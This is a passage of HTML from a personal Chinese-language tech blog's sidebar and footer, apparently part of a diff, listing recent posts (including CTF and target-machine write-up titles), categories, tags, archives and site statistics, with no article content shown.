flaskSession 伪造）</a><time datetime="2025-07-22T07:07:22.000Z" title="Created 2025-07-22 15:07:22">2025-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/30/Bamuwe%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/" title="Bamuwe靶机复盘"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Bamuwe靶机复盘"/></a><div class="content"><a class="title" href="/2025/04/30/Bamuwe%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/" title="Bamuwe靶机复盘">Bamuwe靶机复盘</a><time datetime="2025-04-30T13:18:23.000Z" title="Created 2025-04-30 21:18:23">2025-04-30</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>Categories</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"><span class="card-category-list-name">人工智能</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">安全</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"><span class="card-category-list-name">数据分析</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%88%AC%E8%99%AB/"><span class="card-category-list-name">爬虫</span><span class="card-category-list-count">2</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%88%AC%E8%99%AB/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"><span class="card-category-list-name">数据分析</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E9%9A%8F%E7%AC%94/"><span class="card-category-list-name">随笔</span><span class="card-category-list-count">2</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/%E9%98%85%E8%AF%BB/" style="font-size: 1.1em; color: #999">阅读</a> <a href="/tags/%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80/" style="font-size: 1.1em; color: #999">王者荣耀</a> <a href="/tags/%E7%B2%BE%E7%A5%9E%E5%A4%B1%E5%B8%B8/" style="font-size: 1.1em; color: #999">精神失常</a> <a href="/tags/CTF/" style="font-size: 1.5em; color: #99a9bf">CTF</a> <a href="/tags/python/" style="font-size: 1.1em; color: #999">python</a> <a href="/tags/github/" style="font-size: 1.1em; color: #999">github</a> <a href="/tags/Penetration/" style="font-size: 1.1em; color: #999">Penetration</a> <a href="/tags/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/" style="font-size: 1.3em; color: #99a1ac">群友靶机</a> <a href="/tags/vulnhub/" style="font-size: 1.1em; color: #999">vulnhub</a> <a href="/tags/%E6%91%98%E5%BD%95/" style="font-size: 1.1em; color: #999">摘录</a> <a href="/tags/%E5%90%AF%E5%8F%91/" style="font-size: 1.1em; color: #999">启发</a> <a href="/tags/%E5%A4%A7%E6%A8%A1%E5%9E%8B/" style="font-size: 1.3em; color: #99a1ac">大模型</a> <a href="/tags/%E5%B0%8F%E9%A1%B9%E7%9B%AE/" style="font-size: 1.3em; color: #99a1ac">小项目</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 1.1em; color: #999">靶机</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 1.1em; color: #999">爬虫</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>Archives</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/07/">
+            <span class="card-archive-list-date">
+              July 2025
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/04/">
+            <span class="card-archive-list-date">
+              April 2025
+            </span>
+            <span class="card-archive-list-count">16</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Website Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article Count :</div><div class="item-count">20</div></div><div class="webinfo-item"><div class="item-name">Unique Visitors :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Page Views :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Update :</div><div class="item-count" id="last-push-date" data-lastPushDate="2025-07-24T05:46:45.480Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Neuroblue</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
